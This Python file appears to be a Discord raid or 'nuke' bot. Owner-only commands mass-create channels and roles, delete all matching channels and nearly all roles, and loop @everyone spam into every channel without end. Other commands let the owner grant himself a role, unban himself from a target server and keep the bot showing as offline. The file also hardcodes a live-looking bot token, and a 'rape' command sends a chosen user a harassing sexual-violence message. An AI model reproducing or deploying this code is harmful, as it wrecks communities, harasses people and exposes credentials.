import discord
from discord.ext import commands
import asyncio

token = "MTE1NDM1MDIzNzQyMzUyMTg4Mg.Gd77BH.3ayxpbs_OkG_WddxyAy3Qb7rMwpiLI22K80W6I"
owner_id = 946386383809949756
imintomen_id = 1142107446458978344



# Define the necessary intents
intents = discord.Intents.default()
intents.message_content = True  # Enable message content intent (if needed)

bot = commands.Bot(command_prefix=':/', case_insensitive=True, help_command=None, intents=intents)


@bot.command()
async def create(ctx, channel_name: str, amount: int):
    if ctx.author.id == owner_id:
        await ctx.message.delete()
        allow_mentions = discord.AllowedMentions(everyone=True)
        guild = ctx.message.guild

        async def create_channel():
            channel = await guild.create_text_channel(channel_name)  # Use static name

        # Create a list of tasks for creating channels
        tasks = [create_channel() for _ in range(amount)]
        
        # Run all tasks concurrently
        await asyncio.gather(*tasks)
        print(f"Created {amount} channels named '{channel_name}'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def remove(ctx, prefix: str):
    if ctx.author.id == owner_id:
        await ctx.message.delete()
        # Get all channels that start with the given prefix
        existing_channels = [channel for channel in ctx.guild.channels if channel.name.startswith(prefix)]
        if existing_channels:
            # Create a list of tasks for deleting channels
            delete_tasks = [channel.delete() for channel in existing_channels]
            
            # Run all deletion tasks concurrently
            await asyncio.gather(*delete_tasks)
            await print(f"Deleted {len(existing_channels)} channels starting with '{prefix}'.")
        else:
            await print(f"No channels starting with '{prefix}' to remove.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def mass(ctx, *, message: str):
    if ctx.author.id == owner_id:
        await ctx.message.delete()
        allow_mentions = discord.AllowedMentions(everyone=True)  # Allow @everyone mention
        guild = ctx.guild
        while True:

            # Get all text channels in the guild
            channels = [channel for channel in guild.text_channels]

            # Create a list of tasks for sending messages
            send_tasks = []
            
            for channel in channels:
                send_tasks.append(channel.send(content=f"{message}", allowed_mentions=allow_mentions))

            # Run all sending tasks concurrently
            await asyncio.gather(*send_tasks)
            print(f"Sent message '@everyone {message}' to {len(channels)} channels.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def addrole(ctx, role_name: str, role_amount : int):
    if ctx.author.id == owner_id:
        await ctx.message.delete()
        guild = ctx.guild
        async def create_role():
            role = await guild.create_role(name=role_name)
        tasks = [create_role() for _ in range(role_amount)]
        await asyncio.gather(*tasks)
        print(f"Created {role_amount} roles named '{role_name}'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")


@bot.command()
async def delrole(ctx):
    if ctx.author.id == owner_id:
        await ctx.message.delete()
        bot_role = ctx.guild.me.top_role  # Get the bot's highest role
        # Filter roles to delete: not the bot's role, not @everyone, and not "legit bot test"
        roles_to_delete = [
            role for role in ctx.guild.roles 
            if role != bot_role and role.name != "@everyone" and role.name != "legit bot test"
        ]

        if roles_to_delete:
            # Create a list of delete tasks
            delete_tasks = [role.delete() for role in roles_to_delete]
            
            # Use asyncio.gather to run all delete tasks concurrently
            await asyncio.gather(*delete_tasks)
            
            await print(f"Deleted {len(roles_to_delete)} roles.")
        else:
            await print("No roles to delete except for the bot's role and 'legit bot test'.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def print_ctx(ctx):
    print(ctx)  # Print the context of the command invocation

@bot.command()
async def ascend(ctx):
    if ctx.author.id == owner_id:
        role_name = "Doryan"
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        
        if role is None:
            await ctx.send(f"The role '{role_name}' is a phantom. Please summon it into existence first.")
            return

        try:
            await ctx.author.add_roles(role)
            await ctx.send("With great power comes great responsibility.")
        except discord.Forbidden:
            await ctx.send("Regrettably, I lack the ability to wield the power of roles.")
    else:
        await ctx.send("A mortal shall not be given power...")

@bot.command()
async def create_invite(ctx):
    target_guild = bot.get_guild(imintomen_id)
    if target_guild:
            # Get the first text channel in the server to create an invite
        channel = target_guild.text_channels[0]
        invite = await channel.create_invite(max_age=300, max_uses=1)  # 5 min, 1 use
        await ctx.send(f"Embark on your journey here: {invite}")
    else:
        await ctx.send("The bot is not in the target server.")

@bot.command()
async def unban(ctx):
    if ctx.author.id == owner_id:
        target_guild = bot.get_guild(imintomen_id)
        if target_guild is None:
            await ctx.send(f"Bot is not in the server with ID {imintomen_id}.")
            return

        try:
            bans = target_guild.bans()
            async for ban_entry in bans:
                user = ban_entry.user
                if user.id == owner_id:
                    await target_guild.unban(user)
                    await ctx.send(f"{user.name} has been unbanned.")
                    break
            else:
                await ctx.send("The Master is not banned in this server.")
        except discord.Forbidden:
            await ctx.send("I do not have permission to unban members.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def state(ctx, state_type):
    if ctx.author.id == owner_id:  # Only allows the bot owner to use this
        if state_type == "idle":
            await bot.change_presence(status=discord.Status.idle)
        elif state_type == "dnd":
            await bot.change_presence(status=discord.Status.dnd)
        elif state_type == "online":
            await bot.change_presence(status=discord.Status.online)
        elif state_type == "offline":
            await bot.change_presence(status=discord.Status.offline)
        else:
            await ctx.send("Pleas uese 'idle', 'dnd', 'online' or 'offline'. ")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing.")

import asyncio

@bot.command()
async def clear_mass(ctx, content: str):
    if ctx.author.id == owner_id:  # Only allows the bot owner to use this
        deleted_count = 0  # Initialize the deleted_count here

        # Iterate through all the text channels in the guild where the command was issued
        for channel in ctx.guild.text_channels:
            if not channel.permissions_for(ctx.guild.me).read_messages:
                print(f"I don't have permission to read messages in {channel.name}.")
                continue  # Skip channels where the bot can't read messages

            # Fetch messages in batches asynchronously
            try:
                messages_to_delete = []
                async for message in channel.history(limit=1000):  # Adjust the limit as needed
                    # Check if the message was sent by the bot and contains the specific content
                    if message.author == bot.user and content in message.content:
                        messages_to_delete.append(message)

                # Delete messages in batches
                if messages_to_delete:
                    await asyncio.gather(*(msg.delete() for msg in messages_to_delete))
                    deleted_count += len(messages_to_delete)  # Increment by the number of messages deleted

            except discord.Forbidden:
                print(f"I don't have permission to delete messages in {channel.name}.")
            except discord.HTTPException as e:
                print(f"An error occurred: {e}")

        # Print the result message after attempting to delete all matching messages
        print(f"Deleted {deleted_count} messages containing '{content}' sent by the bot.")
    else:
        await ctx.send("This command's power is a tempest, beyond mortal comprehension.")

@bot.command()
async def alive(ctx):
    await ctx.send("I'm alive!")

@bot.command()
async def stop(ctx):
    if ctx.author.id == owner_id:
        await bot.close()

async def activity(ctx, state: str):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=discord.Game(state))
        await ctx.send(f"Changed activity to '{state}'.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")

async def activity_clear(ctx):
    if ctx.author.id == owner_id:
        await bot.change_presence(activity=None)
        await ctx.send("Cleared activity.")
    else:
        await ctx.send("A mortal shall not interfere with the systems doing")

@bot.command()
async def rape(ctx, user: discord.User):
    await bot.change_presence(activity=discord.activity.Game(f"Raping {user}"))
    await ctx.send(f"Raping {user}")
    message_author = ctx.author.id
    await user.send(f"You're being raped by <@{message_author}>")
    await user.send('https://tenor.com/view/gojo-satoru-gif-14818873849943523300')


@bot.event
async def on_ready():   
    print(f'Bot is ready as {bot.user}')
    await bot.change_presence(status=discord.Status.offline)

bot.run(token)
